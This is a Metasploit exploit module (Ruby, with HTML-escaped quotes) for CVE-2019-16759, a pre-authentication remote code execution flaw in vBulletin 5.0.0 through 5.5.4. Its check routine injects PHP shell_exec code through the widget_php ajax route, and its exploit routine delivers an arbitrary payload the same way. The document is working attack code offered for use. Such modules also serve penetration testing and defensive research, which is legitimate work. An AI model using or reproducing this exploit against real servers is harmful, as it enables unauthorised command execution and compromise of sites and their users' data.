# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
 super(update_info(info,
      &#039;Description&#039;    => %q{
        This should work on all versions from 5.0.0 till 5.5.4
      },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [
          &#039;Reported by: anonymous&#039;,  # reported by
          &#039;Original exploit by: anonymous&#039;,  # original exploit
          &#039;Metasploit mod by: r00tpgp&#039;,  # metasploit module
      ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;    => "\x22",
        },
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;CVE-2019-16759&#039;],
          [&#039;EDB&#039;, &#039;NA&#039;],
          [&#039;URL&#039;, &#039;https://seclists.org/fulldisclosure/2019/Sep/31&#039;],
          [&#039;URL&#039;, &#039;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16759&#039;]
        ],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [
          [ &#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }  ],
      #    [&#039;vBulletin 5.0.X&#039;, {&#039;chain&#039; => &#039;vB_Database&#039;}],
      #    [&#039;vBulletin 5.1.X&#039;, {&#039;chain&#039; => &#039;vB_Database_MySQLi&#039;}],
      ],
      &#039;DisclosureDate&#039; => &#039;Sep 23 2019&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [ true, "The base path to the web application", "/"])
        ])

  end

    def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path,&#039;/index.php?routestring=ajax/render/widget_php&#039;),
      &#039;encode_params&#039; => false,
      &#039;vars_post&#039;     => 
      {
        &#039;widgetConfig[code]&#039;  => "echo shell_exec(\&#039;echo h4x0000r4l1f4 > /tmp/msf.check.out; cat /tmp/msf.check.out\&#039;);exit;",
      }
     })

     if res && res.body && res.body.include?(&#039;h4x0000r4l1f4&#039;)
       return Exploit::CheckCode::Vulnerable
     end

     Exploit::CheckCode::Safe
  end

    def exploit
      print_status("Sending payload.....")
      resp = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path,&#039;/index.php?routestring=ajax/render/widget_php&#039;),
      &#039;encode_params&#039; => false,
      &#039;vars_post&#039;     =>
      {
        #&#039;widgetConfig[code]&#039;  => "echo " + payload.encoded + "exit;",
	 &#039;widgetConfig[code]&#039;  => payload.encoded,
      }
     })
      #unless resp and resp.code == 200
      # fail_with(Failure::Unknown, "Exploit failed.")
      #end

      #print_good("Success!")
      #print_line(resp.body)

   end
end

